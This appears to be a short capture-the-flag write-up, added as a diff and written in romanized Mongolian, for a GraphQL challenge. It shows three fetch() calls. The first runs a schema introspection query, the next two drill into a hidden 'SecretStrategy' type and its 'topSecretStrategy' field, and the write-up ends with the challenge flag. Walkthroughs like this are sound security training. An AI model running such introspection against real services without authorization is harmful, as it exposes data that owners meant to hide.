@@ -1,0 +1,69 @@
+1. graphql ashiglj bga gdgig source code nos harj bolno
+
+    fetch('/graphql', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            query: `
+                {
+                __schema {
+                    types {
+                    name
+                    fields {
+                        name
+                    }
+                    }
+                }
+                }
+            `
+        })
+    }).then(r => r.json()).then(console.log)
+
+    - gej buh type uudig harahad 'Query' dotor secretStrategy mun gadnan SecretStrategy gej bn
+
+2. secretStrategy luuga orj shalgy
+
+    fetch('/graphql', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+        query: `
+        {
+            __type(name: "SecretStrategy") {
+            name
+            fields {
+                name
+                type {
+                name
+                kind
+                }
+            }
+            }
+        }
+        `
+    }),
+    }).then(r => r.json()).then(console.log)
+
+    - gehed topSecretStrategy gdgig olno
+
+3. topSecretStrategy iig shalgahad
+
+    fetch('/graphql', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+        query: `
+        query {
+            secretStrategy {
+            topSecretStrategy
+            }
+        }
+        `
+    }),
+    }).then(r => r.json()).then(console.log)
+
+    - flag oldono
+
+flag : HZU18{GraphQL_CS2_Str4t3gy_Exp0sed_2d89bd4c349e}
